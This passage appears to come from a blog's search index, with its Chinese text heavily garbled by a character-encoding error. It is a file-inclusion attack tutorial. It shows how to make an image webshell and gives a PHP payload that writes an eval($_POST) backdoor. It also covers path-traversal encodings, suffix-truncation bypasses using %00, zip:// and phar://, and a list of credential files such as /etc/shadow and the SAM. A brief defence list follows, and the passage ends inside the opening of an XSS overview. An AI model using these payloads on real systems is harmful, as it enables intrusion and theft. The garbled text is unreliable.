æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„å’Œä¸´æ—¶æ–‡ä»¶åï¼Œç›´æ¥åŒ…å«å³å¯ã€‚è¿™ä¸ªæ–¹æ³•å¯ä»¥å‚è€ƒ[LFI With PHPInfo Assistance](https://www.insomniasec.com/downloads/publications/LFI With PHPInfo Assistance.pdf) ç±»ä¼¼åˆ©ç”¨ä¸´æ—¶æ–‡ä»¶çš„å­˜åœ¨ï¼Œç«äº‰æ—¶é—´å»åŒ…å«çš„ï¼Œå¯ä»¥çœ‹çœ‹è¿™é“CTFé¢˜ï¼šXMANå¤ä»¤è¥-2017-babyweb-writeup 3.7 åŒ…å«ä¸Šä¼ æ–‡ä»¶ å¾ˆå¤šç½‘ç«™é€šå¸¸ä¼šæä¾›æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œæ¯”å¦‚ï¼šä¸Šä¼ å¤´åƒã€æ–‡æ¡£ç­‰ï¼Œè¿™æ—¶å°±å¯ä»¥é‡‡å–ä¸Šä¼ ä¸€å¥è¯å›¾ç‰‡æœ¨é©¬çš„æ–¹å¼è¿›è¡ŒåŒ…å«ã€‚ å›¾ç‰‡é©¬çš„åˆ¶ä½œæ–¹å¼å¦‚ä¸‹ï¼Œåœ¨cmdæ§åˆ¶å°ä¸‹è¾“å…¥ï¼š è¿›å…¥1.jphå’Œ2.phpçš„æ–‡ä»¶ç›®å½•åï¼Œæ‰§è¡Œï¼š copy 1.jpg/b+2.php 3.jpg å°†å›¾ç‰‡1.jpgå’ŒåŒ…å«phpä»£ç çš„2.phpæ–‡ä»¶åˆå¹¶ç”Ÿæˆå›¾ç‰‡é©¬3.jpg å‡è®¾å·²ç»ä¸Šä¼ ä¸€å¥è¯å›¾ç‰‡æœ¨é©¬åˆ°æœåŠ¡å™¨ï¼Œè·¯å¾„ä¸º/upload/201811.jpg å›¾ç‰‡ä»£ç å¦‚ä¸‹ï¼š &lt;?fputs(fopen(\"shell.php\",\"w\"),\"&lt;?php eval($_POST['pass']);?&gt;\")?&gt; ç„¶åè®¿é—®URLï¼šhttp://www.xxxx.com/index.php?page=./upload/201811.jpgï¼ŒåŒ…å«è¿™å¼ å›¾ç‰‡ï¼Œå°†ä¼šåœ¨index.phpæ‰€åœ¨çš„ç›®å½•ä¸‹ç”Ÿæˆshell.php 3.8 å…¶ä»–åŒ…å«å§¿åŠ¿ åŒ…å«SMTP(æ—¥å¿—) åŒ…å«xss 0x04 ç»•è¿‡æ–¹æ³• 4.1 æŒ‡å®šå‰ç¼€ç»•è¿‡ 4.1.1 ç›®å½•éå† ä½¿ç”¨ â€¦/â€¦/ æ¥è¿”å›ä¸Šä¸€ç›®å½•ï¼Œè¢«ç§°ä¸ºç›®å½•éå†(Path Traversal)ã€‚ä¾‹å¦‚ ?file=â€¦/â€¦/phpinfo/phpinfo.php æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š &lt;?php error_reporting(0); $file = $_GET[\"file\"]; //å‰ç¼€ include \"/var/www/html/\".$file; highlight_file(__FILE__); ?&gt; ç°åœ¨åœ¨/var/logç›®å½•ä¸‹æœ‰æ–‡ä»¶flag.txtï¼Œåˆ™åˆ©ç”¨â€¦/å¯ä»¥è¿›è¡Œç›®å½•éå†ï¼Œæ¯”å¦‚æˆ‘ä»¬å°è¯•è®¿é—®ï¼š include.php?file=../../log/flag.txt åˆ™æœåŠ¡å™¨ç«¯å®é™…æ‹¼æ¥å‡ºæ¥çš„è·¯å¾„ä¸ºï¼š/var/www/html/â€¦/â€¦/log/test.txtï¼Œå³ /var/log/flag.txtï¼Œä»è€ŒåŒ…å«æˆåŠŸã€‚ 4.1.2 ç¼–ç ç»•è¿‡ æœåŠ¡å™¨ç«¯å¸¸å¸¸ä¼šå¯¹äºâ€¦/ç­‰åšä¸€äº›è¿‡æ»¤ï¼Œå¯ä»¥ç”¨ä¸€äº›ç¼–ç æ¥è¿›è¡Œç»•è¿‡ã€‚ 1.åˆ©ç”¨urlç¼–ç  ../ %2e%2e%2f ..%2f %2e%2e/ ..\\ %2e%2e%5c ..%5c %2e%2e\\ 2.äºŒæ¬¡ç¼–ç  ../ %252e%252e%252f ..\\ %252e%252e%255c 3.å®¹å™¨/æœåŠ¡å™¨çš„ç¼–ç æ–¹å¼ ../ ..%c0%af æ³¨ï¼šWhy does Directory traversal attack %C0%AF work? %c0%ae%c0%ae/ æ³¨ï¼šjavaä¸­ä¼šæŠŠâ€%c0%aeâ€è§£æä¸ºâ€\\uC0AEâ€ï¼Œæœ€åè½¬ä¹‰ä¸ºASCCIIå­—ç¬¦çš„â€.â€ï¼ˆç‚¹ï¼‰ Apache Tomcat Directory Traversal ..\\ ..%c1%9c æ³¨ï¼šé‚£é‡Œçš„è¶…é“¾æ¥æ˜¯ï¼šWhy does Directory traversal attack %C0%AF work? 4.2 æŒ‡å®šåç¼€ç»•è¿‡ åç¼€ç»•è¿‡æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼Œä¸‹è¿°å„åç¼€ç»•è¿‡æ–¹æ³•å‡ä½¿ç”¨æ­¤ä»£ç ï¼š &lt;?php error_reporting(0); $file = $_GET[\"file\"]; //åç¼€ include $file.\".txt\"; highlight_file(__FILE__); ?&gt; 4.2.1 åˆ©ç”¨url åœ¨è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆRFIï¼‰ä¸­ï¼Œå¯ä»¥åˆ©ç”¨queryæˆ–fragmentæ¥ç»•è¿‡åç¼€é™åˆ¶ã€‚ å¯å‚è€ƒæ­¤æ–‡ç« ï¼šURIâ€™s fragment å®Œæ•´urlæ ¼å¼ï¼š protocol :// hostname[:port] / path / [;parameters][?query]#fragment query(?) [è®¿é—®å‚æ•°] ?file=http://localhost:8081/phpinfo.php? [æ‹¼æ¥å] ?file=http://localhost:8081/phpinfo.php?.txt ä¸Šè¿°å¯èƒ½æ˜¯?æˆªæ–­ï¼š ?å·æˆªæ–­ï¼Œåœ¨è·¯å¾„åé¢è¾“å…¥?å·ï¼ŒæœåŠ¡å™¨ä¼šè®¤ä¸º?å·åé¢çš„å†…å®¹ä¸ºGETæ–¹æ³•ä¼ é€’çš„å‚æ•°è€Œè¢«ä¸¢å¼ƒï¼ŒæˆåŠŸè¯»å–getshellå¦‚ä¸‹ï¼š ç©ºæ ¼ç»•è¿‡ è¿™é‡Œä¹Ÿæ˜¯ä¸€æ ·éœ€è¦ä½¿ç”¨ç¼–ç %20è¿›è¡Œç»•è¿‡ï¼Œä¸èƒ½ç›´æ¥è¾“å…¥ç©ºæ ¼ã€‚ ?file=http://localhost:8081/phpinfo.php%20.txt #å·ç»•è¿‡ï¼š ?file=http://localhost:8081/phpinfo.php%23.txt æ³¨ï¼šè¿™é‡Œéœ€è¦å¯¹#è¿›è¡Œurlç¼–ç ï¼Œ#çš„urlç¼–ç ä¸º%23 Exampleï¼šï¼ˆè®¾åœ¨æ ¹ç›®å½•ä¸‹æœ‰flag2.txtæ–‡ä»¶ï¼‰ fragment(#) [è®¿é—®å‚æ•°] ?file=http://localhost:8081/phpinfo.php%23 [æ‹¼æ¥å] ?file=http://localhost:8081/phpinfo.php#.txt Exampleï¼šï¼ˆè®¾åœ¨æ ¹ç›®å½•ä¸‹æœ‰flag2.txtæ–‡ä»¶ï¼‰ å…¶ä»–ç»•è¿‡æ–¹å¼ï¼š ä¸€äº›å¸¸è§çš„ç‰¹æ®Šå­—ç¬¦URLç¼–ç ï¼š è¿™é‡Œå¯ä»¥ç”¨burpçˆ†ç ´ä¸€éï¼Œçœ‹å“ªä¸ªèƒ½ç”¨ 4.2.2 åˆ©ç”¨åè®® åˆ©ç”¨zip://å’Œphar://ï¼Œç”±äºæ•´ä¸ªå‹ç¼©åŒ…éƒ½æ˜¯æˆ‘ä»¬çš„å¯æ§å‚æ•°ï¼Œé‚£ä¹ˆåªéœ€è¦çŸ¥é“ä»–ä»¬çš„åç¼€ï¼Œä¾¿å¯ä»¥è‡ªå·±æ„å»ºã€‚ zip:// [è®¿é—®å‚æ•°] ?file=zip://D:\\zip.jpg%23phpinfo [æ‹¼æ¥å] ?file=zip://D:\\zip.jpg#phpinfo.txt phar:// [è®¿é—®å‚æ•°] ?file=phar://zip.zip/phpinfo [æ‹¼æ¥å] ?file=phar://zip.zip/phpinfo.txt Exampleï¼š (æˆ‘çš„ç¯å¢ƒæ ¹ç›®å½•ä¸­æœ‰php.zipå‹ç¼©åŒ…ï¼Œå†…å«phpinfo.txtï¼Œå…¶ä¸­åŒ…å«ä»£ç )ï¼‰ æ‰€ä»¥åˆ†åˆ«æ„é€ payloadä¸ºï¼š* ?file=zip://D:\\PHPWAMP_IN3\\wwwroot\\php.zip%23phpinfo ?file=phar://../../php.zip/phpinfo å¯¹åº”çš„ç»“æœåˆ†åˆ«ä¸ºï¼š 4.2.3 é•¿åº¦æˆªæ–­ åˆ©ç”¨æ¡ä»¶ï¼š phpç‰ˆæœ¬&lt;php 5.2.8 åŸç†ï¼š Windowsä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º256å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒ Linuxä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º4096å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒã€‚ åˆ©ç”¨æ–¹æ³•ï¼š åªéœ€è¦ä¸æ–­çš„é‡å¤ ./(Windowsç³»ç»Ÿä¸‹ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ . æˆªæ–­) ?file=shell.php./././ã€‚ã€‚çœç•¥ã€‚ã€‚ //æŒ‡å®šçš„åç¼€çš„è¢«ä¸¢å¼ƒï¼ŒæˆåŠŸåŒ…å«æœ¨é©¬æ–‡ä»¶ åˆ™æŒ‡å®šçš„åç¼€.txtä¼šåœ¨è¾¾åˆ°æœ€å¤§å€¼åä¼šè¢«ç›´æ¥ä¸¢å¼ƒæ‰ 4.2.4 %00æˆªæ–­ HPé­”æœ¯å¼•å¯¼ä»‹ç» å½“sqlå¥ä¸­å«æœ‰å•å¼•å·ï¼ŒåŒå¼•å·ï¼Œåæ–œæ å’ŒNULæ—¶ï¼Œè¿™æ—¶å€™å¦‚æœä¸å¯¹è¿™äº›ç¬¦å·è¿›è¡Œè½¬ä¹‰ï¼Œå†™å…¥æ•°æ®åº“æ—¶å°±ä¼šå‡ºé”™ï¼Œè€Œé­”æœ¯å¼•å·magic_quotes_gpc()å°±æ˜¯å¯¹è¿™äº›ç¬¦å·è¿›è¡Œè½¬ä¹‰ä»¥ä¾¿èƒ½æŠŠæ•°æ®æ­£ç¡®å†™å…¥æ•°æ®åº“ã€‚ä¸è¿‡è¯¥å‚æ•°åœ¨php.iniæ–‡ä»¶ä¸­ä¿®æ”¹ã€‚ PHPé­”æœ¯å¼•å·ç‰¹æ€§å·²è‡ª PHP5.3.0èµ·åºŸå¼ƒå¹¶å°†è‡ªPHP5.4.0èµ·ç§»é™¤ã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨æœ¬å®éªŒç¯å¢ƒçš„PHPç‰ˆæœ¬ä¸­ä»æ˜¯å­˜åœ¨çš„ åœ¨ä½ç‰ˆæœ¬ä¸­phpè¯»å–æ–‡ä»¶åæ—¶è®¤ä¸º%00æ˜¯ç»ˆæ­¢ç¬¦ï¼Œå¯¹äº%00åé¢çš„å†…å®¹å°±ä¼šå¤±æ•ˆ åˆ©ç”¨æ¡ä»¶ï¼š magic_quotes_gpc = Off phpç‰ˆæœ¬ &lt; php 5.3.4 åˆ©ç”¨æ–¹æ³•ï¼š ç›´æ¥åœ¨æ–‡ä»¶åçš„æœ€ååŠ ä¸Š%00æ¥æˆªæ–­æŒ‡å®šçš„åç¼€å ?file=shell.php%00 //ç°é˜¶æ®µ%00æˆªæ–­ä¸å¸¸ç”¨ 4.2.5 ç‚¹å·æˆªæ–­ åŸç†ï¼š windowsç³»ç»Ÿ ç‚¹å· é•¿äº 256ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒï¼› linuxç³»ç»Ÿ ç‚¹å· é•¿äº 4096ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒï¼› ç¤ºä¾‹ï¼š http://192.168.100.150/test_include/index.php?page=1.png................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................. burpæŠ“åŒ…ä¿®æ”¹å³å¯ 4.2.6 åŒå†™ç»•è¿‡ å½“å†™å…¥æ–‡ä»¶æ—¶ï¼Œå‘ç°åˆ é™¤æŸäº›ç‰¹æ®Šå­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥åˆ¤æ–­æ˜¯åˆ é™¤äº†å…¶ä¸­å­—ç¬¦ï¼Œä¾‹å¦‚â€php\"ï¼Œâ€œâ€¦/â€ï¼Œåªéœ€ å†å¢åŠ ä¸€ä¸ªä½¿å…¶åˆ é™¤åå¾—åˆ°æˆ‘ä»¬éœ€è¦çš„ï¼Œéœ€è¦æ³¨æ„ç»å¯¹è·¯å¾„ä¸ç›¸å¯¹è·¯å¾„ã€‚ 4.2.7 å¤§å°å†™æ··åˆç»•è¿‡ å¦‚æœåœ¨æ–‡ä»¶åŒ…å«æ—¶ï¼ŒæœåŠ¡å™¨å¯¹æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°æ²¡æœ‰è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ï¼Œæ¯”å¦‚æ²¡æ²¡æœ‰å¯¹å¤§å°å†™è¿›è¡Œè¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤§å°å†™æ··åˆè¿›è¡Œç»•è¿‡ã€‚ 0x05 æ¼æ´é˜²æŠ¤ 1ã€ä½¿ç”¨str_replaceç­‰æ–¹æ³•è¿‡æ»¤æ‰å±é™©å­—ç¬¦ 2ã€é…ç½®open_basedirï¼Œé˜²æ­¢ç›®å½•éå†ï¼ˆopen_basedir å°†phpæ‰€èƒ½æ‰“å¼€çš„æ–‡ä»¶é™åˆ¶åœ¨æŒ‡å®šçš„ç›®å½•æ ‘ä¸­ï¼‰ 3ã€phpç‰ˆæœ¬å‡çº§ï¼Œé˜²æ­¢%00æˆªæ–­ 4ã€å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œé‡å‘½åï¼Œé˜²æ­¢è¢«è¯»å– 5ã€å¯¹äºåŠ¨æ€åŒ…å«çš„æ–‡ä»¶å¯ä»¥è®¾ç½®ä¸€ä¸ªç™½åå•ï¼Œä¸è¯»å–éç™½åå•çš„æ–‡ä»¶ã€‚ 6ã€åšå¥½ç®¡ç†å‘˜æƒé™åˆ’åˆ†ï¼Œåšå¥½æ–‡ä»¶çš„æƒé™ç®¡ç†ï¼Œallow_url_includeå’Œallow_url_fopenæœ€å°æƒé™åŒ– ./è¡¨ç¤ºå½“å‰ä½ç½®è·¯å¾„ï¼Œ../è¡¨ç¤ºä¸Šä¸€çº§è·¯å¾„ä½ç½®ï¼Œåœ¨linuxä¸­åŒæ ·é€‚ç”¨ã€‚ 3ï¼‰ä¸€äº›å¸¸è§çš„æ•æ„Ÿä¿¡æ¯è·¯å¾„ï¼š Windowsç³»ç»Ÿï¼š c:\\boot.ini // æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ c:\\windows\\system32\\inetsrv\\MetaBase.xml // IISé…ç½®æ–‡ä»¶ c:\\windows\\repair\\sam // å­˜å‚¨Windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç  c:\\ProgramFiles\\mysql\\my.ini // MySQLé…ç½® c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL rootå¯†ç  c:\\windows\\php.ini // php é…ç½®ä¿¡æ¯ Linux/Unixç³»ç»Ÿï¼š /etc/passwd // è´¦æˆ·ä¿¡æ¯ /etc/shadow // è´¦æˆ·å¯†ç æ–‡ä»¶ /usr/local/app/apache2/conf/httpd.conf // Apache2é»˜è®¤é…ç½®æ–‡ä»¶ /usr/local/app/apache2/conf/extra/httpd-vhost.conf // è™šæ‹Ÿç½‘ç«™é…ç½® /usr/local/app/php5/lib/php.ini // PHPç›¸å…³é…ç½® /etc/httpd/conf/httpd.conf // Apacheé…ç½®æ–‡ä»¶ /etc/my.conf // mysql é…ç½®æ–‡ä»¶","categories":["å¸¸è§topæ¼æ´"]},{"title":"æµ…æXSSæ¼æ´","path":"/2023/08/07/qian-xi-xss-lou-dong/","content":"XSSæ³¨å…¥æ€»ç»“ ä¸€ã€XSSæ¼æ´åŸç† XSSï¼Œå³è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œæ˜¯æŒ‡æ”»å‡»è€…åˆ©ç”¨WebæœåŠ¡å™¨ä¸­çš„åº”ç”¨ç¨‹åºæˆ–ä»£ç æ¼æ´ï¼Œåœ¨é¡µé¢ä¸­åµŒå…¥å®¢æˆ·ç«¯è„šæœ¬ï¼ˆé€šå¸¸æ˜¯ä¸€æ®µç”±JavaScriptç¼–å†™çš„æ¶æ„ä»£ç ï¼Œå°‘æ•°æƒ…å†µä¸‹è¿˜æœ‰ActionScriptã€VBScriptç­‰è¯­è¨€ï¼‰ï¼Œå½“ä¿¡ä»»æ­¤WebæœåŠ¡å™¨çš„ç”¨æˆ·è®¿é—®Webç«™ç‚¹ä¸­å«æœ‰æ¶æ„è„šæœ¬ä»£ç çš„é¡µé¢æˆ–æ‰“å¼€æ”¶åˆ°çš„URLé“¾æ¥æ—¶ï¼Œç”¨æˆ·æµè§ˆå™¨ä¼šè‡ªåŠ¨åŠ è½½å¹¶æ‰§è¡Œè¯¥æ¶æ„ä»£ç ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚ å½“åº”ç”¨ç¨‹åºæ²¡æœ‰å¯¹ç”¨æˆ·æäº¤çš„å†…å®¹è¿›è¡ŒéªŒè¯å’Œé‡æ–°ç¼–ç ï¼Œè€Œæ˜¯ç›´æ¥å‘ˆç°ç»™ç½‘ç«™çš„è®¿é—®è€…æ—¶ï¼Œå°±å¯èƒ½ä¼šè§¦å‘XSSæ”»å‡»ã€‚ äºŒã€XSSæ¼æ´çš„å±å®³ ï¼ˆ1ï¼‰çªƒå–ç®¡ç†å‘˜å¸å·æˆ–Cookieã€‚å…¥ä¾µè€…å¯ä»¥å†’å……ç®¡ç†å‘˜çš„èº«ä»½ç™»å½•åå°ï¼Œä½¿å¾—å…¥ä¾µè€…å…·æœ‰æ¶æ„æ“çºµåå°æ•°æ®çš„èƒ½åŠ›ï¼ŒåŒ…æ‹¬è¯»å–ã€æ›´æ”¹ã€æ·»åŠ ã€åˆ é™¤ä¸€äº›ä¿¡æ¯ã€‚ ï¼ˆ2ï¼‰çªƒå–ç”¨æˆ·çš„ä¸ªäººä¿¡æ¯æˆ–è€…ç™»å½•å¸å·ï¼Œå¯¹ç½‘ç«™çš„ç”¨æˆ·å®‰å…¨äº§ç”Ÿå·¨å¤§çš„å¨èƒã€‚ä¾‹å¦‚å†’å……ç”¨æˆ·èº«ä»½è¿›è¡Œå„ç§æ“ä½œã€‚ ï¼ˆ3ï¼‰ç½‘ç«™æŒ‚é©¬ã€‚å…ˆå°†æ¶æ„æ”»å‡»ä»£ç åµŒå…¥åˆ°Webåº”ç”¨ç¨‹åºä¹‹ä¸­ã€‚å½“ç”¨æˆ·æµè§ˆè¯¥æŒ‚é©¬é¡µé¢æ—¶ï¼Œç”¨æˆ·çš„è®¡ç®—æœºä¼šè¢«æ¤å…¥æœ¨é©¬ã€‚ ï¼ˆ4ï¼‰å‘é€å¹¿å‘Šæˆ–è€…åƒåœ¾ä¿¡æ¯ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨XSSæ¼æ´æ¤å…¥å¹¿å‘Šï¼Œæˆ–è€…å‘é€åƒåœ¾ä¿¡æ¯ï¼Œä¸¥é‡å½±å“åˆ°ç”¨æˆ·çš„æ­£å¸¸ä½¿ç”¨ã€‚ ä¸‰ã€XSSæ¼æ´çš„åˆ†ç±» 1ã€åå°„å‹XSS åå°„å‹XSSï¼Œä¹Ÿç§°ä¸ºéæŒä¹…æ€§XSSï¼Œæ˜¯æœ€å¸¸è§çš„ä¸€ç§XSSã€‚ XSSä»£ç å¸¸å¸¸å‡ºç°åœ¨URLè¯·æ±‚ä¸­ï¼Œå½“ç”¨æˆ·è®¿é—®å¸¦æœ‰XSSä»£ç çš„URLè¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ç«¯æ¥æ”¶è¯·æ±‚å¹¶å¤„ç†ï¼Œç„¶åå°†å¸¦æœ‰XSSä»£ç çš„æ•°æ®è¿”å›ç»™æµè§ˆå™¨ï¼Œæµè§ˆå™¨è§£æè¯¥æ®µå¸¦æœ‰XSSä»£ç çš„æ•°æ®å¹¶æ‰§è¡Œï¼Œæ•´ä¸ªè¿‡ç¨‹å°±åƒä¸€æ¬¡åå°„ï¼Œæ•…ç§°ä¸ºåå°„å‹XSSã€‚ è¯¥ç±»æ”»å‡»çš„ä¸»è¦ç‰¹ç‚¹æ˜¯å®ƒçš„åŠæ—¶æ€§å’Œä¸€æ¬¡æ€§ï¼Œå³ç”¨æˆ·æäº¤è¯·æ±‚åï¼Œå“åº”ä¿¡æ¯ä¼šç«‹å³åé¦ˆç»™ç”¨æˆ·ã€‚è¯¥ç±»æ”»å‡»å¸¸å‘ç”Ÿåœ¨æœç´¢å¼•æ“ã€é”™è¯¯æç¤ºé¡µé¢ç­‰å¯¹ç”¨æˆ·çš„è¾“å…¥åšå‡ºç›´æ¥ååº”çš„åœºæ™¯ä¸­ã€‚ 2ã€å­˜å‚¨å‹XSS å­˜å‚¨å‹XSSï¼Œä¹Ÿç§°ä¸ºæŒä¹…æ€§XSSã€‚ åœ¨å­˜å‚¨å‹XSSä¸­ï¼ŒXSSä»£ç è¢«å­˜å‚¨åˆ°æœåŠ¡å™¨ç«¯ï¼Œå› æ­¤å…è®¸ç”¨æˆ·å­˜å‚¨æ•°æ®åˆ°æœåŠ¡å™¨ç«¯çš„Webåº”ç”¨ç¨‹åºå¯èƒ½å­˜åœ¨è¯¥ç±»å‹XSSæ¼æ´ã€‚æ”»å‡»è€…æäº¤ä¸€æ®µXSSä»£ç åï¼ŒæœåŠ¡å™¨æ¥æ”¶å¹¶å­˜å‚¨ï¼Œå½“å…¶ä»–ç”¨æˆ·è®¿é—®åŒ…å«è¯¥XSSä»£ç çš„é¡µé¢æ—¶ï¼ŒXSSä»£ç è¢«æµè§ˆå™¨è§£æå¹¶æ‰§è¡Œã€‚ å­˜å‚¨å‹XSSæ”»å‡»çš„ç‰¹ç‚¹ä¹‹ä¸€æ˜¯æäº¤çš„æ¶æ„å†…å®¹ä¼šè¢«æ°¸ä¹…å­˜å‚¨ï¼Œå› è€Œä¸€ä¸ªå•ç‹¬çš„æ¶æ„ä»£ç å°±ä¼šä½¿å¤šä¸ªç”¨æˆ·å—å®³ï¼Œæ•…è¢«ç§°ä¸ºæŒä¹…æ€§XSSï¼Œå®ƒä¹Ÿæ˜¯è·¨ç«™è„šæœ¬æ”»å‡»ä¸­å±å®³æœ€çš„ä¸€ç±»ã€‚äºŒæ˜¯è¢«å­˜å‚¨çš„ç”¨æˆ·æäº¤çš„æ¶æ„å†…å®¹ä¸ä¸€å®šè¢«é¡µé¢ä½¿ç”¨ï¼Œå› æ­¤å­˜åœ¨å±é™©çš„å“åº”ä¿¡æ¯ä¸ä¸€å®šè¢«ç«‹å³è¿”å›ï¼Œä¹Ÿè®¸åœ¨è®¿é—®é‚£äº›åœ¨æ—¶é—´ä¸Šå’Œç©ºé—´ä¸Šæ²¡æœ‰ç›´æ¥å…³è”çš„é¡µé¢æ—¶æ‰ä¼šå¼•å‘æ”»å‡»ï¼Œå› æ­¤å­˜åœ¨ä¸ç¡®å®šæ€§å’Œæ›´å¥½çš„éšè”½æ€§ã€‚ è¿™ç±»æ”»å‡»çš„ä¸€ä¸ªå…¸å‹åœºæ™¯æ˜¯ç•™è¨€æ¿ã€åšå®¢å’Œè®ºå›ç­‰ï¼Œå½“æ¶æ„ç”¨æˆ·åœ¨æŸè®ºå›é¡µé¢å‘å¸ƒå«æœ‰æ¶æ„çš„Javascriptä»£ç çš„ç•™è¨€æ—¶ï¼Œè®ºå›ä¼šå°†è¯¥ç”¨æˆ·çš„ç•™è¨€å†…å®¹ä¿å­˜åœ¨æ•°æ®åº“æˆ–æ–‡ä»¶ä¸­å¹¶ä½œä¸ºé¡µé¢å†…å®¹çš„ä¸€éƒ¨åˆ†æ˜¾ç¤ºå‡ºæ¥ã€‚å½“å…¶ä»–ç”¨æˆ·æŸ¥çœ‹è¯¥æ¶æ„ç”¨æˆ·çš„ç•™è¨€æ—¶ï¼Œæ¶æ„ç”¨æˆ·æäº¤çš„æ¶æ„ä»£ç å°±ä¼šåœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­è§£æå¹¶æ‰§è¡Œã€‚ 3ã€DOMå‹XSS DOM (Document Objet Model)æŒ‡æ–‡æ¡£å¯¹è±¡æ¨¡å‹ã€‚ DOMå¸¸ç”¨æ¥è¡¨ç¤ºåœ¨HTMLå’ŒXMLä¸­çš„å¯¹è±¡ã€‚DOMå¯ä»¥å…è®¸ç¨‹åºåŠ¨æ€çš„è®¿é—®å’Œæ›´æ–°æ–‡æ¡£çš„å†…å®¹ã€ç»“æ„ç­‰ã€‚å®¢æˆ·ç«¯JavaScriptå¯ä»¥è®¿é—®æµè§ˆå™¨çš„æ–‡æ¡£å¯¹è±¡æ¨¡å‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡JavaScriptä»£ç æ§åˆ¶DOMèŠ‚ç‚¹å°±å¯ä»¥ä¸ç»è¿‡æœåŠ¡å™¨ç«¯çš„å‚ä¸é‡æ„HTMLé¡µé¢ã€‚ è¯¥ç±»æ”»å‡»æ˜¯åå°„å‹XSSçš„å˜ç§ã€‚å®ƒé€šå¸¸æ˜¯ç”±äºå®¢æˆ·ç«¯æ¥æ”¶åˆ°çš„è„šæœ¬ä»£ç å­˜åœ¨é€»è¾‘é”™è¯¯æˆ–è€…ä½¿ç”¨ä¸å½“å¯¼è‡´çš„ã€‚æ¯”å¦‚Javascriptä»£ç ä¸æ­£ç¡®åœ°ä½¿ç”¨å„ç§DOMæ–¹æ³•(å¦‚document.write)å’ŒJavascriptå†…éƒ¨å‡½æ•°(å¦‚evalå‡½æ•°)ï¼ŒåŠ¨æ€æ‹¼æ¥HTMLä»£ç å’Œè„šæœ¬ä»£ç å°±å®¹æ˜“å¼•å‘DOMå‹çš„è·¨ç«™è„šæœ¬æ”»å‡»ã€‚ å› æ­¤ï¼ŒDOMå‹XSSä¸å‰é¢ä¸¤ç§XSSçš„åŒºåˆ«å°±åœ¨äºDOMå‹XSSæ”»å‡»çš„ä»£ç ä¸éœ€è¦ä¸æœåŠ¡å™¨ç«¯è¿›è¡Œäº¤äº’ï¼ŒDOMå‹XSSçš„è§¦å‘åŸºäºæµè§ˆå™¨ç«¯å¯¹DOMæ•°æ®çš„è§£ææ¥å®Œæˆï¼Œä¹Ÿå°±æ˜¯å®Œå…¨æ˜¯å®¢æˆ·ç«¯çš„äº‹æƒ…ã€‚ 4ã€åˆ¤æ–­æ˜¯å“ªä¸€ç§XSS å‘é€ä¸€æ¬¡å¸¦XSSä»£ç çš„è¯·æ±‚ï¼Œè‹¥åªèƒ½åœ¨å½“å‰è¿”å›çš„æ•°æ®åŒ…é‡Œå‘ç°XSSä»£ç ï¼Œåˆ™æ˜¯åå°„å‹ï¼›è‹¥ä»¥åè¿™ä¸ªé¡µé¢çš„è¿”å›åŒ…é‡Œéƒ½ä¼šæœ‰XSSä»£ç ï¼Œåˆ™æ˜¯å­˜å‚¨å‹ï¼›è‹¥åœ¨è¿”å›åŒ…é‡Œæ‰¾ä¸åˆ°XSSä»£ç ï¼Œåˆ™æ˜¯DOMå‹ã€‚ å››ã€XSSæ¼æ´çš„æ£€æµ‹ä¸é˜²å¾¡ 1ã€æ£€æµ‹ æ‰‹å·¥æ£€æµ‹ æ‰‹å·¥æ£€æµ‹é‡ç‚¹è¦è€ƒè™‘æ•°æ®è¾“å…¥çš„åœ°æ–¹ï¼Œä¸”éœ€è¦æ¸…æ¥šè¾“å…¥çš„æ•°æ®è¾“å‡ºåˆ°ä»€ä¹ˆåœ°æ–¹ã€‚ åœ¨æ£€æµ‹çš„å¼€å§‹ï¼Œå¯ä»¥è¾“å…¥ä¸€äº›æ•æ„Ÿå­—ç¬¦ï¼Œæ¯”å¦‚â€œ&lt;ã€&gt;ã€ï¼ˆï¼‰â€ç­‰ï¼Œæäº¤åæŸ¥çœ‹ç½‘é¡µæºä»£ç çš„å˜åŒ–ä»¥å‘ç°è¾“å…¥è¢«è¾“å‡ºåˆ°ä»€ä¹ˆåœ°æ–¹ï¼Œä¸”å¯ä»¥å‘ç°ç›¸å…³æ•æ„Ÿå­—ç¬¦æ˜¯å¦è¢«è¿‡æ»¤ã€‚ æ‰‹å·¥æ£€æµ‹ç»“æœç›¸å¯¹å‡†ç¡®ï¼Œä½†æ•ˆç‡è¾ƒä½ã€‚ å·¥å…·æ£€æµ‹ å¸¸ç”¨å·¥å…·æœ‰AVWSï¼ˆAcunetix Web Vulnerability 